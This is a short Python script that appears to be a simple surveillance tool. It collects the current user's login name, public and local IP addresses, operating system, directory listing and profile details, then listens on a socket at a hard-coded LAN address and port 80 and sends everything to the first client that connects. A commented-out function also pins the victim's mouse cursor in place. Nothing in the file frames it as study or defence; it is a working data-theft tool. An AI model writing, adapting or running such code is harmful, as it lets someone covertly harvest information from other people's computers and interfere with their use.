import subprocess
import mouse
import socket
from sys import platform, api_version, getprofile
from os import getlogin, listdir
from time import sleep
import threading
from requests import get


# FARVER #
red = "\033[91;1m"
reset = "\033[0m"
green = "\033[92;1m"
cyan = "\033[96;1m"
yellow = "\033[93;1m"
magenta = "\033[95;1m"
blue = "\033[94;1m"
white = "\033[97;1m"
blink = "\033[5m"
# END OF FARVER

HOST = "192.168.68.104"
PORT = 80
BUFFER = 1024*3


def lock_mouse(X, Y, time_in_milliseconds):
    num = 0
    pos = (X,Y)
    mouse.move(X, Y)
    while True:
        num += 1
        if mouse.get_position() != pos:
            mouse.move(pos[0], pos[1])
            sleep(0.1)
        else:
            num += 1
        
        if num >= time_in_milliseconds:
            break

def listen_for_host(host,port):
    address = (host,port)
    print(f"Getting information...")
    get_os_info()
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.bind(address)
    except:
        print(F"couldnt bind to {address[0]}:{address[1]} are you sure its the right ip?")
    print(f"Listening for host...")
    sock.listen(5)
    try:
        conn, ip = sock.accept()
    except:
        print(f"[+] couldnt recive the connection!")
    print(f"[+] Connection recived from UNKNOWN...")
    msg =   f"\
            user: {info_list[0]}\n\
            public ip: {info_list[1]}\n\
            local ip: {info_list[2]}\n\
            operating system: {info_list[3]}\n\
            directory contents: {info_list[4]}\n\
            profiles: {info_list[5]}\n\
            api version: {info_list[6]}\n"

    conn.send(f"\n{msg}".encode())
    conn.close()
    exit()
    
    

def get_os_info():

    global info_list
    info_list = []

    user = getlogin()
    public_ip = get('https://api.ipify.org').text
    local_ip = socket.gethostbyname(socket.gethostname())
    operating_system = platform
    dir_content = listdir()
    profiles = getprofile()
    api = api_version

    all = user, public_ip, local_ip, operating_system, dir_content, profiles, api

    for i in all:
        info_list.append(i)


# lock_mouse_pos = threading.Thread(target=lock_mouse(0,0,10000000000)).start()
print_numbers_forever_ = threading.Thread(target=listen_for_host(HOST,PORT)).start()
